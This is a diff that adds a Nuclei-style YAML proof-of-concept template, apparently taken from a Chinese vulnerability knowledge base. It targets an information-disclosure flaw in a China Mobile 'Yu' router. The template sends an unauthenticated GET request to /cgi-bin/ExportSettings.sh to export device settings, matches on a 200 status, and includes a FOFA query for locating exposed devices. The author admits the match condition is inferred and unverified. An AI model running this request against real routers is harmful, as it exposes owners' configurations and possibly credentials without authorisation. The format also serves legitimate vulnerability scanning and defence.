@@ -1,0 +1,27 @@
+id: poc-7779cae0581fdaa93f26
+info:
+  name: 中国移动禹路由ExportSettings.sh存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7779cae0581fdaa93f26c0bfb28f6486
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7779cae0581fdaa93f26c0bfb28f6486
+    fofa: fofa：title="互联世界 物联未来-登录"
+http:
+- raw:
+  - 'GET /cgi-bin/ExportSettings.sh HTTP/1.1
+
+    Host:127.0.0.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
